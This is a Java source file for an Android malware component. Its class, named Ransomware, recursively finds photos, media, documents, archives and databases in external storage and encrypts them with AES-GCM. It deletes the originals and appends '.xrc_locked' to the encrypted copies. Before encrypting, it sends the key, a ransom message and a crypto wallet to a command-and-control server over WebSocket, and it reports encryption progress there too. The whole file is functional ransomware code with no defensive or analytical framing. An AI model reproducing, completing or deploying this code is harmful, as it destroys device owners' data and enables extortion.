package com.xrc.system.features;

import android.content.Context;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.core.CryptoManager;
import com.xrc.system.network.WebSocketClient;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class Ransomware {
    private static final String TAG = Constants.TAG + ":Ransom";
    private static final String EXTENSION = ".xrc_locked";
    private static final String[] TARGET_EXTENSIONS = {
        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp",
        ".mp4", ".avi", ".mkv", ".mov", ".wmv",
        ".mp3", ".wav", ".flac", ".aac", ".ogg",
        ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".txt", ".rtf", ".csv", ".xml", ".json",
        ".zip", ".rar", ".7z", ".tar", ".gz",
        ".db", ".sql", ".sqlite", ".db3"
    };
    private static Ransomware instance;
    private final Context ctx;
    private final CryptoManager crypto;
    private final SecureRandom random;
    private boolean encrypting = false;
    private byte[] currentKey;

    private Ransomware(Context ctx) {
        this.ctx = ctx.getApplicationContext();
        this.crypto = new CryptoManager();
        this.random = new SecureRandom();
    }

    public static synchronized Ransomware get(Context ctx) {
        if (instance == null) {
            instance = new Ransomware(ctx);
        }
        return instance;
    }

    public void encryptDevice(String message, String wallet) {
        if (encrypting) return;
        encrypting = true;
        currentKey = crypto.generateRandomBytes(32);
        String keyB64 = android.util.Base64.encodeToString(currentKey, android.util.Base64.NO_WRAP);

        // Send key to C2 before encryption
        try {
            JSONObject keyData = new JSONObject();
            keyData.put("type", "ransom_key");
            keyData.put("key", keyB64);
            keyData.put("message", message);
            keyData.put("wallet", wallet);
            WebSocketClient.get(ctx).sendEvent("ransom_start", keyData);
        } catch (JSONException e) {
            Log.e(TAG, "Key send failed", e);
        }

        List<File> targets = collectTargets();
        new Thread(() -> {
            int count = 0;
            for (File f : targets) {
                if (encryptFile(f)) count++;
                if (count % 10 == 0) {
                    reportProgress(count, targets.size());
                }
            }
            encrypting = false;
            reportComplete(count);
        }).start();
    }

    public void decryptDevice() {
        if (currentKey == null) {
            Log.e(TAG, "No decryption key available");
            return;
        }
        List<File> targets = collectEncrypted();
        new Thread(() -> {
            int count = 0;
            for (File f : targets) {
                if (decryptFile(f)) count++;
            }
            reportDecrypted(count);
        }).start();
    }

    private boolean encryptFile(File file) {
        try {
            FileInputStream fis = new FileInputStream(file);
            byte[] data = new byte[(int) file.length()];
            fis.read(data);
            fis.close();

            byte[] iv = new byte[12];
            random.nextBytes(iv);
            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
            javax.crypto.spec.GCMParameterSpec spec = new javax.crypto.spec.GCMParameterSpec(128, iv);
            cipher.init(javax.crypto.Cipher.ENCRYPT_MODE,
                    new javax.crypto.spec.SecretKeySpec(currentKey, "AES"), spec);
            byte[] encrypted = cipher.doFinal(data);

            byte[] combined = new byte[iv.length + encrypted.length];
            System.arraycopy(iv, 0, combined, 0, iv.length);
            System.arraycopy(encrypted, 0, combined, iv.length, encrypted.length);

            FileOutputStream fos = new FileOutputStream(file.getAbsolutePath() + EXTENSION);
            fos.write(combined);
            fos.close();
            file.delete();
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Encrypt failed: " + file.getName(), e);
            return false;
        }
    }

    private boolean decryptFile(File file) {
        try {
            FileInputStream fis = new FileInputStream(file);
            byte[] data = new byte[(int) file.length()];
            fis.read(data);
            fis.close();

            byte[] iv = Arrays.copyOfRange(data, 0, 12);
            byte[] encrypted = Arrays.copyOfRange(data, 12, data.length);

            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
            javax.crypto.spec.GCMParameterSpec spec = new javax.crypto.spec.GCMParameterSpec(128, iv);
            cipher.init(javax.crypto.Cipher.DECRYPT_MODE,
                    new javax.crypto.spec.SecretKeySpec(currentKey, "AES"), spec);
            byte[] decrypted = cipher.doFinal(encrypted);

            String originalPath = file.getAbsolutePath().replace(EXTENSION, "");
            FileOutputStream fos = new FileOutputStream(originalPath);
            fos.write(decrypted);
            fos.close();
            file.delete();
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Decrypt failed: " + file.getName(), e);
            return false;
        }
    }

    private List<File> collectTargets() {
        List<File> targets = new ArrayList<>();
        File sd = Environment.getExternalStorageDirectory();
        collectRecursive(sd, targets, 0);
        return targets;
    }

    private List<File> collectEncrypted() {
        List<File> targets = new ArrayList<>();
        File sd = Environment.getExternalStorageDirectory();
        collectEncryptedRecursive(sd, targets, 0);
        return targets;
    }

    private void collectRecursive(File dir, List<File> targets, int depth) {
        if (depth > 5) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isDirectory() && !f.getName().startsWith(".")) {
                collectRecursive(f, targets, depth + 1);
            } else if (f.isFile() && isTargetExtension(f.getName())) {
                targets.add(f);
            }
        }
    }

    private void collectEncryptedRecursive(File dir, List<File> targets, int depth) {
        if (depth > 5) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isDirectory()) {
                collectEncryptedRecursive(f, targets, depth + 1);
            } else if (f.getName().endsWith(EXTENSION)) {
                targets.add(f);
            }
        }
    }

    private boolean isTargetExtension(String name) {
        String lower = name.toLowerCase();
        for (String ext : TARGET_EXTENSIONS) {
            if (lower.endsWith(ext)) return true;
        }
        return false;
    }

    private void reportProgress(int current, int total) {
        try {
            JSONObject data = new JSONObject();
            data.put("current", current);
            data.put("total", total);
            data.put("percent", (int) ((current / (float) total) * 100));
            WebSocketClient.get(ctx).sendEvent("ransom_progress", data);
        } catch (JSONException e) {
            Log.e(TAG, "Progress report failed", e);
        }
    }

    private void reportComplete(int count) {
        try {
            JSONObject data = new JSONObject();
            data.put("encrypted", count);
            data.put("status", "complete");
            WebSocketClient.get(ctx).sendEvent("ransom_complete", data);
        } catch (JSONException e) {
            Log.e(TAG, "Complete report failed", e);
        }
    }

    private void reportDecrypted(int count) {
        try {
            JSONObject data = new JSONObject();
            data.put("decrypted", count);
            data.put("status", "decrypted");
            WebSocketClient.get(ctx).sendEvent("ransom_decrypted", data);
        } catch (JSONException e) {
            Log.e(TAG, "Decrypt report failed", e);
        }
    }
}
